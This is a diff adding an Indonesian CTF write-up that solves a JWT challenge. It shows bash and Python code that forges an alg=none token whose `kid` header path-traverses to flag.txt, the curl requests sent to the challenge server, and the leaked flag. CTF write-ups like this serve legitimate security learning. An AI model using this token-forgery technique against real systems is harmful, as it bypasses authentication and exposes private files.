@@ -1,0 +1,113 @@
+---
+title: "Gryphons CTF - Kid Named Jason (web/crypto)"
+date: "2025-11-03"
+tags: ["web", "crypto", "writeup", "gryphons"]
+summary: "Write-up untuk challenge 'Kid named Jason' — JWT header `kid` path traversal + alg=none exploit leading to file leak/flag."
+image: "/blog/the_diary/public.png"
+author: "Erwin Wijaya"
+draft: false
+featured: false
+---
+
+## Pendahuluan
+
+Challenge **Kid named Jason** menghadirkan sebuah web challenge yang berhubungan dengan **JWT**. Endpoint penting:
+
+- `/token` — menyediakan contoh token non-admin.
+- `/verify` — menerima header `Authorization: Bearer <token>` dan memverifikasi token.
+
+Token contoh yang diberikan:
+```
+eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleXMvcHVibGljLnBlbSIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QifQ.xoCiZ57qIqZ-i-XWN8E_q_0jqDDrXYmW3KwD6VA4I6g
+```
+
+Pesan awal dari percobaan mengindikasikan server **mengharuskan** header JWT berisi field `kid` — jika tidak ada, server mengembalikan `No kid in header`.
+
+---
+
+## Analisis Singkat
+
+Dari pengujian ditemukan perilaku-perilaku berikut:
+
+1. Server **meminta `kid`** di header; tanpa `kid` server menolak.
+2. Ketika `kid` berisi path seperti `../../../../../flag.txt` dan `alg` diset `none`, server merespon dengan JSON yang memuat `file_leak` berisi isi file tersebut (flag).
+3. Server juga menampilkan isi `keys/public.pem` saat `kid` di-set ke `keys/public.pem`, sehingga `kid` diperlakukan sebagai path internal untuk membaca file.
+
+Ini menunjukkan dua kelemahan yang digabung:
+- **Path traversal via `kid`** — server membaca file yang direferensikan oleh `kid`.
+- **Alg `none` handling** — server mengizinkan token dengan `alg=none` untuk diproses bila `kid` ada.
+
+Kombinasi ini menghasilkan kebocoran file sensitif (termasuk flag).
+
+---
+
+## Eksploit (Langkah demi langkah)
+
+### 1) Konsep token
+Kita akan membuat JWT dengan:
+- Header: `{"alg":"none","typ":"JWT","kid":"../../../../../flag.txt"}`
+- Payload: `{"user":"admin","role":"admin"}`
+- Signature: kosong (karena `alg=none`)
+
+Token JWT `alg=none` berformat:
+```
+base64url(header) + "." + base64url(payload) + "."
+```
+
+> Penting: gunakan encoding base64 url-safe tanpa padding (hapus `=`).
+
+### 2) Perintah `curl` (bash + openssl)
+Langsung jalankan di terminal:
+```bash
+H='{"alg":"none","typ":"JWT","kid":"../../../../../flag.txt"}'
+P='{"user":"admin","role":"admin"}'
+H64=$(printf '%s' "$H" | openssl base64 -A | tr '+/' '-_' | tr -d '=')
+P64=$(printf '%s' "$P" | openssl base64 -A | tr '+/' '-_' | tr -d '=')
+TOKEN="${H64}.${P64}."
+curl -s -H "Authorization: Bearer $TOKEN" http://chal1.gryphons.sg:8000/verify
+```
+
+Output yang diharapkan (contoh nyata dari challenge):
+```json
+{"error":"The specified alg value is not allowed","file_leak":"GCTF25{t0ken_of_4ppreciation}","ok":false}
+```
+
+### 3) Alternatif dengan Python (lebih aman)
+Satu-liner untuk menghasilkan token:
+```bash
+python3 - <<'PY'
+import base64, json
+h={"alg":"none","typ":"JWT","kid":"../../../../../flag.txt"}
+p={"user":"admin","role":"admin"}
+def b64u(o): return base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).decode().rstrip('=')
+print(f"{b64u(h)}.{b64u(p)}.")
+PY
+```
+
+Kemudian:
+```bash
+TOKEN=$(python3 gen_token.py) # atau gunakan heredoc di atas
+curl -s -H "Authorization: Bearer $TOKEN" http://chal1.gryphons.sg:8000/verify
+```
+
+---
+
+## Bukti (Output dari eksploit)
+Pada percobaan, server merespon:
+```
+{"error":"The specified alg value is not allowed","file_leak":"GCTF25{t0ken_of_4ppreciation}","ok":false}
+```
+Sehingga **flag** adalah:
+```
+GCTF25{t0ken_of_4ppreciation}
+```
+
+
+## Kesimpulan
+
+Challenge ini adalah contoh klasik kombinasi kelemahan JWT (alg=none handling) dan path traversal pada `kid`. Eksploit relatif singkat: buat token `alg=none` + `kid` yang menunjuk ke file flag → kirim ke `/verify` → server mengembalikan `file_leak` berisi flag.
+
+---
+
+
+
